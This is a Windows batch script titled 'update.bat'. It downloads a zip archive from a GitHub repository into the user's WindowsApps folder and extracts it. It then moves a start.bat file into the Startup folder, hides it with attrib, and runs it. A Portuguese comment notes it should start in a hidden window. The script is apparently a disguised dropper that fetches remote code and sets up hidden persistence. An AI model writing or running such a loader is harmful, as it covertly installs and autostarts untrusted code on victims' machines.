@ECHO OFF
Title update.bat
powershell.exe -c "Invoke-WebRequest -OutFile %localappdata%\Microsoft\WindowsApps\main.zip -Uri https://github.com/hulaneoTi/testes/archive/refs/heads/main.zip"
powershell.exe -c "Expand-Archive -Path '%localappdata%\Microsoft\WindowsApps\main.zip' -DestinationPath '%localappdata%\Microsoft\WindowsApps' -Force"
dir /b %localappdata%\Microsoft\WindowsApps\testes-main > %localappdata%\Microsoft\WindowsApps\list.txt
move %localappdata%\Microsoft\WindowsApps\testes-main\*.* %localappdata%\Microsoft\WindowsApps
move "%localappdata%\Microsoft\WindowsApps\start.bat" "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\"
attrib +h "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\start.bat"
::Iniciar no start.bat em janela oculta.
"%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\start.bat"